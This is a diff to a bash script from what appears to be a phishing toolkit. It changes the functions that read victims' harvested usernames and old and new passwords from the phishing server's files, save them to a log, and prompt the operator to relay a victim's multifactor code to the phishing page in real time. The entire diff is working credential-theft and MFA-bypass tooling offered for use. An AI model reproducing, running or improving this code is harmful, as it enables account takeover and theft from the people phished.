@@ -433,31 +433,12 @@ capture_ip() {
 
 ## Extract code
 extract_code() {
-    if [ -f .server/www/code.txt ]; then
-        read -p "Enter the new code (leave empty to keep the existing code): " USER_INPUT
-        if [ -z "$USER_INPUT" ]; then
-            CODE=$(awk '{print $0}' .server/www/code.txt)
-            echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Extracted Code:"
-            echo -e "${BLUE}$CODE"
-            echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/code.txt"
-            echo "$CODE" > auth/code.txt
-
-			send_data http://${HOST}:${PORT}/mfa.html ${USER_INPUT}
-        else
-            echo "$USER_INPUT" > .server/www/code.txt
-            echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} New code entered by user:"
-            echo -e "${BLUE}$USER_INPUT"
-            echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}.server/www/code.txt"
-			send_data http://${HOST}:${PORT}/mfa.html ${USER_INPUT}
-        fi
-    else
-        read -p "Enter the code: " USER_INPUT
-        echo "$USER_INPUT" > .server/www/code.txt
-        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Code entered by user:"
-        echo -e "${BLUE}$USER_INPUT"
-        echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}.server/www/code.txt"
-		send_data http://${HOST}:${PORT}/mfa.html ${USER_INPUT}
-    fi
+	read -p "${RED}[${WHITE}-${RED}]${BLUE} Enter the code: " USER_INPUT
+	echo "$USER_INPUT" > .server/www/code.txt
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Code entered by user: "
+	echo -e "${RED}[${WHITE}-${RED}]${BLUE} $USER_INPUT"
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}.server/www/code.txt"
+	send_data http://${HOST}:${PORT}/loading.html ${USER_INPUT}
 }
 
 ## Send data
@@ -472,16 +453,14 @@ send_data() {
         echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Data sent successfully!"
 		
 		while true; do
-            read -p "Do you want to send another number? (y/n): " choice
+            read -p "${RED}[${WHITE}-${RED}]${BLUE} Do you want to send another number? (y/n): " choice
             case $choice in
                 [Yy]*)
-                    # read -p "Enter the new number: " new_number
-                    # send_data "$url" "$new_number"
 					extract_code
                     break
                     ;;
                 [Nn]*)
-                    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Execution continued..."
+                    echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} continue..."
                     break
                     ;;
                 *)
@@ -499,15 +478,31 @@ send_data() {
 ## Get credentials
 capture_creds() {
 	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | awk '{print $2}')
-	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | awk -F ":." '{print $NF}')
+	OLD_PASSWORD=$(grep -o 'Old: [^ ]*' .server/www/usernames.txt | awk '{print $2}')
+	NEW_PASSWORD=$(grep -o 'New: [^ ]*' .server/www/usernames.txt | awk '{print $2}')
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Old Password : ${BLUE}$OLD_PASSWORD"
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} New Password : ${BLUE}$NEW_PASSWORD"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
 	cat .server/www/usernames.txt >> auth/usernames.dat
 
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Generate Multifactor Code...\n"
-	extract_code
+	while true; do
+		read -p "${RED}[${WHITE}-${RED}]${BLUE} Generate Code? (y/n): " choice
+		case $choice in
+			[Yy]*)
+				extract_code
+				break
+				;;
+			[Nn]*)
+				echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} continue..."
+				break
+				;;
+			*)
+				echo -e "\n${RED}[${WHITE}-${RED}]${RED} Invalid choice. Please try again."
+				;;
+		esac
+	done
 
 	echo -e "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
 
